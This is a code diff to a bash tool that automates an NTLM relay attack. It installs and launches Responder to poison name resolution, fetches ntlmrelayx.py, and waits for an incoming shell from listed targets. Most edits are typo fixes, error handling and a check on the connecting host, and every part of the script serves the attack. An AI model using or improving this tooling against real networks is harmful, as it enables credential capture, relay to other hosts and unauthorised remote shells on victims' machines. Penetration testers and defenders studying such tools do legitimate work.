@@ -68,10 +68,10 @@ function checkApt(){
 		which $1 &>/dev/null
 		if [ $? -eq 0 ];then
 			if [ ! -z $quiet ]; then echo -e "\t${greenColour}[:S]${endColour} $1 installed\n"; sleep 0.5; fi
-            echo "$1" >> $(pwd)/unninstall.txt
+            echo "$1" >> $(pwd)/uninstall.txt
 		else
 			echo -e "\t${redColour}[:S]${endColour} Something bad happened, $1 could not be installed. Exiting...\n"; sleep 0.5
-			exit 1
+			tput cnorm; exit 1
 		fi
 	fi
 }
@@ -86,7 +86,7 @@ function makeBck(){
 
 function checkProgramsNeeded(){
 
-    programs=(tmux rlwrap python python3 netcat)
+    programs=(tmux rlwrap python python3 netcat wget xterm net-tools)
 
     if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
 	
@@ -101,9 +101,9 @@ function checkProgramsNeeded(){
         chmod u+x $(pwd)/responder/Responder.py
         if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 0.5; fi
         makeBck
-        echo "responder" >> $(pwd)/unninstall.txt
+        echo "responder" >> $(pwd)/uninstall.txt
       else
-	    echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 0.5; exit 1
+	    echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
 		fi
 	fi
 
@@ -117,9 +117,9 @@ function checkProgramsNeeded(){
 		if [ $? -eq 0 ]; then
 			chmod u+x "$(pwd)/ntlmrelayx.py"
 			if [ ! -z $quiet  ]; then echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py downloaded succesfully!\n"; sleep 0.5; fi
-			echo "ntlmrelayx" >> unninstall.txt
+			echo "ntlmrelayx" >> uninstall.txt
 		else
-			echo -e "\t${redColour}[:S]${endColour} Something bad happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 0.5; exit 1
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 0.5; tput cnorm; exit 1
 		fi
 	fi
 
@@ -179,7 +179,7 @@ function relayingAttack(){
   fi
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Tmux setted up. Launching Responder...\n"; sleep 0.5; fi
-  tmux send-keys "python3 $(pwd)/responder/Responder.py -I eth0 -drw" C-m && tmux swap-pane -d && sleep 1
+  tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m && tmux swap-pane -d && sleep 1
 
   lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
 
@@ -235,8 +235,21 @@ function relayingAttack(){
     sleep 0.5
   done
 
-  if [ "$portStatus" == "ESTABLISHED" ];then
-    echo -e "${greenColour}[:D]${endColour} Relay succesful! Enjoy your shell!\n"; sleep 0.5
+  rhost=$(netstat -tnualp | grep $lport | awk '{print $4}' | tail -1 | awk -F: '{print $1}')
+  checkrhost=''
+  while read line; do
+    if [ "$rhost" == "$line" ];then
+      checkrhost=1
+    fi
+  done < $targets
+
+  if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
+    echo -ne "${blueColour}[*]${endColour} Authenticating to target $rhost "
+    for i in {1..3}; do
+      sleep 0.5
+      echo -ne "."
+    done
+    echo -e "\n\n${greenColour}[:D]${endColour} Relay successful! Enjoy your shell!\n"; sleep 0.5
   else
     echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
   fi
@@ -248,12 +261,12 @@ function relayingAttack(){
 
 function rmsw(){
 
-  if [ ! -e $(pwd)/unninstall.txt ];then
-    echo -e "${greenColour}[:)]${endcolour} Nothing to unninstall\n"
+  if [ ! -e $(pwd)/uninstall.txt ];then
+    echo -e "${greenColour}[:)]${endcolour} Nothing to uninstall\n"
     tput cnorm; exit 0
   fi
 
-  echo -ne "${redColour}[!!]${endColour} Are you sure you want to unninstall $(cat $(pwd)/unninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm
+  echo -ne "${redColour}[!!]${endColour} Are you sure you want to uninstall $(cat $(pwd)/uninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm
 
   while [[ "$confirm" != "y" && "$confirm" != "n" ]];do
     echo -ne "Please type y or n: ";read confirm
@@ -270,12 +283,12 @@ function rmsw(){
         apt remove -y $line &>/dev/null
       fi
       if [ $? -ne 0 ];then
-        if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to unninstall $line. Try manually\n"; sleep 0.5; fi
+        if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try manually\n"; sleep 0.5; fi
       else
         if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line unninstaled\n"; sleep 0.5; fi
       fi
-    done < $(pwd)/unninstall.txt
-    rm -f $(pwd)/unninstall.txt
+    done < $(pwd)/uninstall.txt
+    rm -f $(pwd)/uninstall.txt
     tput cnorm; exit 0
   else
     tput cnorm; exit 0
@@ -307,8 +320,8 @@ if [ "$(id -u)" == 0 ]; then
 	if [ $parameter_counter -ne 2 ]; then
 		helpMenu
 	else
-        ifconfig $interface &>/dev/null
-        if [ $? -ne 0 ];then
+        iLookUp=$(ip addr | grep $interface | awk -F: '{print $2}' | sed 's/\s*//g')
+        if [ "$interface" !=  "$iLookUp" ];then
           echo -e "${redColour}[D:]${endColour} $interface interface not found\n"; tput cnorm; exit 1
         fi
 
